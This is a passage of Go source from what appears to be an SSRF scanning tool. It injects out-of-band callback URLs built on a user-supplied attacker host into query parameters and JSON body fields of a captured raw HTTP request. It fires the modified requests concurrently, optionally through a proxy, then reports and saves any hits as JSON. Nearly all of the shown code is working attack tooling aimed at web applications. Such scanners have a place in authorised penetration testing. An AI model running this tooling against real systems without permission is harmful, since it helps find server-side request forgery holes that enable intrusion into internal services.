		if *oobPtr != "" {
			for _, param := range ssrfParams {
				wg.Add(1)
				go func(pn string, t Req) {
					sem <- struct{}{}
					defer func() { <-sem }()
					defer wg.Done()
					oob := fmt.Sprintf("http://%s.%s", pn, *oobPtr)
					tempReq := injectPay(t, pn, oob)
					sendHTTP(tempReq.URL, tempReq.Method, tempReq.Headers, []byte(tempReq.Body), *delayPtr, *proxyPtr)
				}(param, tgt)
			}
		}
	}
	wg.Wait()

	fmt.Println("\n" + CC + "========== SSRF VULNERABILITIES ==========" + CRST)
	if len(results) > 0 {
		for _, r := range results {
			fmt.Printf("[%s] %s\n", CG+"HIT"+CRST, r.Test)
			fmt.Printf("   -> Payload : %s\n", CY+r.Payload+CRST)
			fmt.Printf("   -> Status  : %d\n", r.Code)
			fmt.Printf("   -> Evidence: %s\n\n", r.Evidence)
		}
		fmt.Printf("%s Total: %d\n", CG+"[+]"+CRST, len(results))
	} else {
		fmt.Printf("%s No SSRF found.\n", CY+"[-]"+CRST)
	}

	if *outPtr != "" && len(results) > 0 {
		f, _ := os.Create(*outPtr)
		defer f.Close()
		j, _ := json.MarshalIndent(results, "", "  ")
		f.Write(j)
		fmt.Printf("%s Saved: %s\n", CG+"[+]"+CRST, *outPtr)
	}
}

func injectPay(r Req, param, payload string) Req {
	t := r
	p, _ := url.Parse(r.URL)
	qp := p.Query()
	if qp.Get(param) != "" {
		qp.Set(param, payload)
		t.URL = p.Scheme + "://" + p.Host + p.Path + "?" + qp.Encode()
	} else if strings.Contains(strings.ToLower(r.Headers["Content-Type"]), "application/json") && r.Body != "" {
		var jd map[string]interface{}
		json.Unmarshal([]byte(r.Body), &jd)
		jd[param] = payload
		nb, _ := json.Marshal(jd)
		t.Body = string(nb)
	}
	return t
}

func parseRawReq(fn string) (Req, error) {
	f, err := os.Open(fn)
	if err != nil {
		return Req{}, err
	}
	defer f.Close()
	sc := bufio.NewScanner(f)
	var r Req
	r.Headers = make(map[string]string)
	if sc.Scan() {
		parts := strings.SplitN(sc.Text(), " ", 3)
		if len(parts) >= 2 {
			r.Method = parts[0]
			r.URL = parts[1]
		}
	}
	for sc.Scan() {
		l := sc.Text()
		if l == "" {
			break
		}
		parts := strings.SplitN(l, ":", 2)
		if len(parts) == 2 {
			r.Headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			if strings.ToLower(strings.TrimSpace(parts[0])) == "host" && !strings.HasPrefix(r.URL, "http") {
				r.URL = "https://" + strings.TrimSpace(parts[1]) + r.URL
			}
		}
	}
	var bb bytes.Buffer
	for sc.Scan() {
		bb.WriteString(sc.Text() + "\n")
	}
	r.Body = strings.TrimRight(bb.String(), "\n")
	return r, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
